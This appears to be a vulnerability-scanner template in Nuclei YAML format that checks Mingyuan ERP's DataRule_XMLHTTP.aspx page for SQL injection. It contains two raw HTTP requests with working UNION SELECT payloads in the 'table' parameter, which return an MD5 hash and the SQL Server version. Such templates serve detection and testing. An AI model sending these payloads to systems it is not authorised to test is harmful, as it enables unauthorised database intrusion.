id: poc-yaml-mingyuanyun-erp-datarule-xmlhttp-aspx-sqli
info:
  name: 明源地产ERP DataRule_XMLHTTP.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    明源云ERP DataRule_XMLHTTP.aspx SQL Injection vulnerability.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET /BUAdjust/DataRule/DataRule_XMLHTTP.aspx/?ywtype=getFieldXML&table=-1%27%20union%20select%20sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "0x{{t2}}"
      - type: word
        words:
          - "<items>"

  - raw:
      - |
        GET /BUAdjust/DataRule/DataRule_XMLHTTP.aspx/?ywtype=getFieldXML&table=-1%27%20union%20select%20@@version-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Microsoft SQL Server"
      - type: word
        words:
          - "<items>"
